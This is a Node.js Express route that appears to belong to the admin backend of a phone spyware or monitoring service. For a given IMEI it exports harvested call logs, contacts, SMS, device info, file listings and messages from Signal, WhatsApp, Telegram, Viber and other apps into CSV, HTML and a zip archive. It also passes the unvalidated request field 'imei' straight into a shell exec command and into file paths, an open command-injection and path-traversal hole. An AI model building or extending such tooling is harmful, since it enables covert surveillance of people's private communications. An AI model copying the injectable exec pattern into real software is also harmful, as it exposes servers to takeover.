const express = require("express");
const path = require("path");
const ObjectsToCsv = require("objects-to-csv");
const mkdirp = require("mkdirp");
const fs = require("fs");
// const archiver = require("archiver");
const util = require("util");
const exec = util.promisify(require("child_process").exec);

const CallLogs = require("../../../models/CallLogs");
const Conion = require("../../../models/Conion");
const Contacts = require("../../../models/Contacts");
const Imo = require("../../../models/Imo");
const LiveInfos = require("../../../models/LiveInfos");
const Messenger = require("../../../models/Messenger");
const ProtectedText = require("../../../models/ProtectedText");
const Signal = require("../../../models/Signal");
const SmsLogs = require("../../../models/SmsLogs");
const Telegram = require("../../../models/Telegram");
const Viber = require("../../../models/Viber");
const Whatsapp = require("../../../models/Whatsapp");
const FileListing = require("../../../models/FileListing");

const { contactToHtm, deviceInfoToHtm,smsToHtm,callToHtm,fileToHtm ,messageAppToHtm} = require("../../../utils/toHTML");

const router = express.Router();

router.post("/", async (req, res) => {
  try {
    const imei = req.body.imei;
    mkdirp.sync(path.join(__dirname, `../../../files/${imei}/data/`));

    const callLogs = new ObjectsToCsv(await CallLogs.find({ imei }).lean());
    await callLogs.toDisk(
      path.join(__dirname, `../../../files/${imei}/data/callLogs.csv`)
    );
    callToHtm(JSON.stringify(callLogs.data),imei)

    const conion = new ObjectsToCsv(await Conion.find({ imei }).lean());
    await conion.toDisk(
      path.join(__dirname, `../../../files/${imei}/data/conion.csv`)
    );
    messageAppToHtm(conion.data,imei,"Conion")


    const contacts = new ObjectsToCsv(await Contacts.find({ imei }).lean());
    await contacts.toDisk(
      path.join(__dirname, `../../../files/${imei}/data/contacts.csv`)
    );
    contactToHtm(JSON.stringify(contacts.data),imei)

    const imo = new ObjectsToCsv(await Imo.find({ imei }).lean());
    await imo.toDisk(
      path.join(__dirname, `../../../files/${imei}/data/imo.csv`)
    );
    messageAppToHtm(imo.data,imei,"Imo")


    const liveInfos = new ObjectsToCsv(await LiveInfos.find({ imei }).lean());
    await liveInfos.toDisk(
      path.join(__dirname, `../../../files/${imei}/data/liveInfos.csv`)
    );
    deviceInfoToHtm(JSON.stringify(liveInfos.data),imei)

    const messenger = new ObjectsToCsv(await Messenger.find({ imei }).lean());
    await messenger.toDisk(
      path.join(__dirname, `../../../files/${imei}/data/messenger.csv`)
    );
    messageAppToHtm(messenger.data,imei,"Messenger")


    const protectedText = new ObjectsToCsv(
      await ProtectedText.find({ imei }).lean()
    );
    await protectedText.toDisk(
      path.join(__dirname, `../../../files/${imei}/data/protectedText.csv`)
    );
    messageAppToHtm(protectedText.data,imei,"ProtectedText")


    const signal = new ObjectsToCsv(await Signal.find({ imei }).lean());
    await signal.toDisk(
      path.join(__dirname, `../../../files/${imei}/data/signal.csv`)
    );
    messageAppToHtm(signal.data,imei,"Signal")


    const smsLogs = new ObjectsToCsv(await SmsLogs.find({ imei }).lean());
    await smsLogs.toDisk(
      path.join(__dirname, `../../../files/${imei}/data/smsLogs.csv`)
    );
    smsToHtm(JSON.stringify(smsLogs.data),imei)
    
    const telegram = new ObjectsToCsv(await Telegram.find({ imei }).lean());
    await telegram.toDisk(
      path.join(__dirname, `../../../files/${imei}/data/telegram.csv`)
    );

    messageAppToHtm(telegram.data,imei,"Telegram")

    const viber = new ObjectsToCsv(await Viber.find({ imei }).lean());
    await viber.toDisk(
      path.join(__dirname, `../../../files/${imei}/data/viber.csv`)
    );
    messageAppToHtm(viber.data,imei,"Viber")

    const whatsapp = new ObjectsToCsv(await Whatsapp.find({ imei }).lean());
    await whatsapp.toDisk(
      path.join(__dirname, `../../../files/${imei}/data/whatsapp.csv`)
    );
    messageAppToHtm(whatsapp.data,imei,"Whatsapp")

    const fileListingDB= await FileListing.findOne({ imei })
    if(fileListingDB){
      let files = fileListingDB.files;
    
      fileToHtm(JSON.stringify(files),imei)
    }
    

    const directoryPath = path.join(
      path.join(__dirname, `../../../files/${imei}`)
    );
    const { stdout, stderr } = await exec(
      "cd "+directoryPath + "/data && zip -r "+directoryPath + "/data.zip *"
    );
    console.log("stdout:", stdout);
    console.error("stderr:", stderr);
    console.log("----file ziped----");

    res.status(200).json({ message: "Files download ready!" });

   
  } catch (e) {
    console.log("/api/v0.0.1/admin/saveData.js (xinj-9)", e); //xinj-9
    res.status(500).send("/api/v0.0.1/admin/saveData.js (xinj-10)"); //xinj-10
  }
});

module.exports = router;

